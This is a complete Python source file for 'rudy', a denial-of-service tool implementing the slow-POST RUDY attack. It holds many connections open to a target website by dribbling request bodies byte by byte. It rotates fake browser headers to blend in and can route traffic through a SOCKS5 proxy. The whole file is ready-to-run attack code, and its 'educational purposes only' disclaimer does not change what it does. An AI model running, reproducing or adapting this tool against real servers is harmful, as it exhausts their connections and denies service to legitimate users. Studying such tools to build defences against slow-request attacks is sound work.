#!/usr/bin/env python3


 ################################################################
#                                                                #
#  File: rudy.py                                                 #
#                                                                #
#  Author: Sergio Garcia Lopez                                   #
#                                                                #
#  Github: https://github.com/SergiDelta/rudy                    #
#                                                                #
#  Date: September 2021                                          #
#                                                                #
#  Version: 1.1                                                  #
#                                                                #
#  Description: Implementation of RUDY (Are you dead yet?)       #
#               Denial of Service attack in Python. It is a      #
#               "low and slow" attack which generates low        #
#               traffic in order to make each HTTP POST request  #
#               last around 10 minutes. It basically fills       #
#               a form but sends the body of the request byte    #
#               by byte, waiting several seconds after each      #
#               one. In this way, we simulate that we are a      #
#               client with very little bandwith. If we do this  #
#               distributedly, we may exhaust the available      # 
#               server connections, making it impossible for a   #
#               legitimate client to connect.                    #
#                                                                #
#  DISCLAIMER: Please, use this code for educational purposes    #
#              only. I am not responsible for any malicious use  #
#              that may be made of it.                           #
#                                                                #
 ################################################################


import socket
import socks 
import ssl
import argparse
import time
import random
import string
import urllib.parse
import sys


class Logger:
   def __init__(self, verbosity=False):
      self.verbose = verbosity

   def set_verbosity(self, verbosity):
      self.verbose = verbosity

   def log(self, message, file=sys.stdout):
      if self.verbose:
         print(message, file=file)

   def warn(self, message, file=sys.stderr):
      print(f"WARNING: {message}", file=file)

   def error(self, message, file=sys.stderr):
      print(f"ERROR: {message}", file=file)


def print_rudy():
   print("  ______   _   _  ______ _____  ___ ______  __   _______ _____ ___  ")
   print("  | ___ \ | | | | |  _  \  ___|/ _ \|  _  \ \ \ / /  ___|_   _|__ \ ")
   print("  | |_/ / | | | | | | | | |__ / /_\ \ | | |  \ V /| |__   | |    ) |")
   print("  |    /  | | | | | | | |  __||  _  | | | |   \ / |  __|  | |   / / ")
   print("  | |\ \  | |_| | | |/ /| |___| | | | |/ /    | | | |___  | |  |_|  ")
   print("  \_| \_|  \___/  |___/ \____/\_| |_/___/     \_/ \____/  \_/  (_)  ")
   print()
   print("            rudy 1.1 https://github.com/SergiDelta/rudy             ")
   print()


def init_socket(host, port, tls=False, timeout=5):
   sock = socks.socksocket()
   sock.settimeout(timeout)
   sock.connect((host, port))
   if tls:
      ctx = ssl.SSLContext(ssl.PROTOCOL_TLS)
      ctx.load_default_certs()
      sock = ctx.wrap_socket(sock)

   return sock


def generate_http_req(method, path, headers, version="HTTP/1.1"):
   http_req = method + " " + path + " " + version + "\r\n"
   for head in headers:
      http_req += head + "\r\n"

   return http_req


def cli():
   parser = argparse.ArgumentParser(
      prog="rudy",
      description="%(prog)s 1.1 https://github.com/SergiDelta/rudy . " + 
      "Implementation of RUDY (Are you dead yet?) " + 
      "Denial of Service attack in Python."
   )
   parser.add_argument(
      "-s", "--sockets",
      default=150,
      type=int,
      help="Number of sockets (connections) to use. Default is 150."
   )
   parser.add_argument(
      "-t", "--time",
      default=10,
      type=float,
      help="Period of time in seconds that the program will wait " + 
      "before performing another round of byte sending. Default is 10."
   )
   parser.add_argument(
      "-b", "--bytes",
      default=1,
      type=int,
      help="Number of bytes that will be sent per round. Use it in combination " +
      "with -t, --time option in order to the set the bandwidth. Default is 1."
   )
   parser.add_argument(
      "-l", "--length",
      default=64,
      type=int,
      help="Content-Length value (bytes) in HTTP POST request. Default is 64."
   )
   parser.add_argument(
      "-x", "--proxy",
      help="Send requests through a Socks5 proxy, e.g: 127.0.0.1:1080"
   )
   parser.add_argument(
      "-v", "--verbose",
      action="store_true",
      help="Give details about actions being performed."
   )
   parser.add_argument(
      "--version",
      action="version",
      version="%(prog)s version 1.1 https://github.com/SergiDelta/rudy ."
   )
   parser.add_argument(
      "url",
      help='Absolute path to website, i.e [http[s]://]host[:port][file_path]'
   )

   return parser.parse_args()


def main():
   try:
      args = cli()
      url = urllib.parse.urlparse(args.url)
      host = url.netloc
      file_path = ""
      port = 80
      tls = False
      proxy = args.proxy
      logger = Logger(args.verbose)

      if url.scheme == "https":
         tls = True
         port = 443

      if url.scheme == "http" or url.scheme == "https":
         if host.find(":") != -1:
            port = int(host.split(":")[1])
            host = host.split(":")[0]
         file_path = url.path
      else:
         if host == "":
            host = args.url.split("/")[0]
         if host.find(":") != -1:
            port = int(host.split(":")[1])
            host = host.split(":")[0]
            file_path = url.path.split(str(port))[1] # fix urllib parsing
         else:
            host = url.path.split("/")[0]
            file_path = url.path.split(host)[1]

      if file_path == "":
         file_path = "/"

      if proxy:
         if proxy.find(":") == -1:
            logger.error("Invalid format for proxy address")
            sys.exit(1)
         else:
            try:
               proxy = proxy.split(":")
               proxy[1] = int(proxy[1])
               socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy[0], proxy[1], True)
            except:
               logger.error("Cannot set default proxy to " + args.proxy)
               sys.exit(1)
         

      print_rudy()
      if proxy:
         print("Using proxy: " + args.proxy)
      socket_count = args.sockets
      round_time = args.time
      bytes_per_round = args.bytes
      content_length = args.length

      list_of_sockets = []
      ascii_chars = string.digits + string.ascii_letters
      host_header = "Host: " + host
      user_agents = [
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
         "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
         "User-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
         "User-Agent: Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1",
         "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A5370a Safari/604.1",
         "User-Agent: Mozilla/5.0 (iPhone9,3; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
         "User-Agent: Mozilla/5.0 (iPhone9,4; U; CPU iPhone OS 10_0_1 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/14A403 Safari/602.1",
         "User-Agent: Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:69.2.1) Gecko/20100101 Firefox/69.2",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.66.18) Gecko/20177177 Firefox/45.66.18",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
         "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/75.0",
         "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
         "User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
         "User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
         "User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
         "User-Agent: Mozilla/5.0 (X11; Linux ppc64le; rv:75.0) Gecko/20100101 Firefox/75.0",
         "User-Agent: Mozilla/5.0 (X11; Linux; rv:74.0) Gecko/20100101 Firefox/74.0",
         "User-Agent: Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0",
         "User-Agent: Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0",
         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
         "User-Agent: Mozilla/5.0 (X11; Ubuntu i686; rv:52.0) Gecko/20100101 Firefox/52.0",
         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
         "User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
         "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
         "User-Agent: Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36",
         "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
         "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
         "User-Agent: Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
         "User-Agent: Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36",
         "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 7 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19",
         "User-Agent: Mozilla/5.0 (Linux; Android 4.2.1; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
         "User-Agent: Mozilla/5.0 (Linux; Android 4.1.2; GT-I9300 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19",
         "User-Agent: Mozilla/5.0 (Android; Tablet; rv:18.0) Gecko/18.0 Firefox/18.0"

      ]

      accept_header_list = [
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
         "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept: text/html,application/xhtml+xml,image/jxr,*/*"

      ]

      accept_enc_list = [
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip, deflate, br",
         "Accept-Encoding: gzip",
         "Accept-Encoding: gzip",
         "Accept-Encoding: gzip",
         "Accept-Encoding: gzip, compress, br",
         "Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
         "Accept-Encoding: gzip,deflate,sdch",
         "Accept-Encoding: *"

      ]

      accept_lan_list = [
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: en-US,en,q=0.5",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: zh-CN,zh;q=0.8",
         "Accept-Language: pt-BR,pt,q=0.5",
         "Accept-Language: pt-BR,pt,q=0.5",
         "Accept-Language: pt-BR,pt,q=0.5",
         "Accept-Language: pt-BR,pt,q=0.5",
         "Accept-Language: es-MX,es,q=0.5",
         "Accept-Language: es-MX,es,q=0.5",
         "Accept-Language: es-MX,es,q=0.5"

      ]

      default_headers = [
         "Connection: keep-alive",
         "Cache-Control: max-age=0"
      ]

      content_type_header = "Content-Type: application/x-www-form-urlencoded"
      content_length_header = "Content-Length: " + str(args.length)

      print("Attacking %s with %d sockets." % (host, socket_count))
      print("Creating sockets...") 

      for i in range(socket_count):
         try:
            logger.log("Creating socket number " + str(i+1))
            s = init_socket(host, port, tls)
            list_of_headers = []
            list_of_headers.append(host_header)
            list_of_headers.append(random.choice(user_agents))
            list_of_headers.append(random.choice(accept_header_list))
            list_of_headers.append(random.choice(accept_enc_list))
            list_of_headers.append(random.choice(accept_lan_list))
            list_of_headers.extend(default_headers)
            list_of_headers.append(content_type_header)
            list_of_headers.append(content_length_header)
            http_request = generate_http_req("POST", file_path, list_of_headers)
            http_request += "\r\n"
            s.sendall(http_request.encode("utf-8"))
            if s:
               list_of_sockets.append(s)
         except socket.error:
            break

      while True:            
         print("Sending byte in HTTP POST body... Socket count: " + str(len(list_of_sockets)))
         for s in list(list_of_sockets):
            try:
               msg = ""
               for i in range(bytes_per_round):
                  msg += random.choice(ascii_chars)
               s.send(msg.encode("utf-8"))
            except socket.error:
               list_of_sockets.remove(s)

         for i in range(socket_count - len(list_of_sockets)):
            try:
               logger.log("Recreating socket...")
               s = init_socket(host, port, tls)
               list_of_headers = []
               list_of_headers.append(host_header)
               list_of_headers.append(random.choice(user_agents))
               list_of_headers.append(random.choice(accept_header_list))
               list_of_headers.append(random.choice(accept_enc_list))
               list_of_headers.append(random.choice(accept_lan_list))
               list_of_headers.extend(default_headers)
               list_of_headers.append(content_type_header)
               list_of_headers.append(content_length_header)
               http_request = generate_http_req("POST", file_path, list_of_headers)
               http_request += "\r\n"
               s.sendall(http_request.encode("utf-8"))
               if s:
                  list_of_sockets.append(s)
            except socket.error:
               break

         time.sleep(round_time)
      
   except KeyboardInterrupt:
      print()


if __name__ == "__main__":
   main()
 
 
